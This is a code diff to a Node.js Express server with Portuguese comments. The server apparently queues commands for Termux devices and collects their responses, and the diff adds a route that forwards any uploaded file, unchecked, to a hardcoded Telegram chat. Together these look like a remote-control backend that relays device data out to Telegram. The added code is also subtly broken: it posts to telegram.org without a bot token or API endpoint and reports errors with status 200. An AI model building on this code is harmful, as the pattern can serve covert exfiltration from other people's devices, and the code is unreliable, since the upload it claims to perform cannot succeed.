@@ -1,9 +1,13 @@
 const express = require('express');
 const fs = require('fs');
 const path = require('path');
+// Importações necessárias para a nova rota do Telegram
+const axios = require('axios');
+const FormData = require('form-data');
+
 const app = express();
 
-app.use(express.text({ type: '*/*' }));
+app.use(express.text({ type: '*/*', limit: '100mb' }));
 
 const PORT = process.env.PORT || 3000;
 const PASTA_COMANDOS = path.join(__dirname, 'comandos');
@@ -105,6 +109,40 @@ app.post('/termux/resposta', (req, res) => {
     } catch (error) {
         console.error("Erro ao processar resposta do Termux:", error);
         return res.status(500).send("Erro interno no servidor.");
+    }
+});
+
+// =========================================================================
+// ROTA ADICIONADA: PROCESSA E ENVIA QUALQUER POSTFILE PARA O TELEGRAM AS CEGAS
+// =========================================================================
+app.post('/enviar-midia', async (req, res) => {
+    try {
+        if (!req.body || req.body.length === 0) {
+            return res.status(200).send("Erro: Nenhum dado de arquivo recebido.");
+        }
+
+        // Reconstrói com segurança os bytes crus a partir da string fornecida pelo middleware
+        const arquivoBuffer = Buffer.from(req.body, 'binary');
+
+        const form = new FormData();
+        form.append('chat_id', '8880569466');
+        form.append('document', arquivoBuffer, {
+            filename: `midia_${Date.now()}.bin`,
+            contentType: 'application/octet-stream'
+        });
+
+        const urlTelegram = 'https://telegram.org';
+
+        await axios.post(urlTelegram, form, {
+            headers: { ...form.getHeaders() },
+            maxContentLength: Infinity,
+            maxBodyLength: Infinity
+        });
+
+        return res.status(200).send("Sucesso: Enviado ao Telegram.");
+    } catch (error) {
+        console.error("Erro Telegram:", error.message);
+        return res.status(200).send(`Erro: ${error.message}`);
     }
 });
 
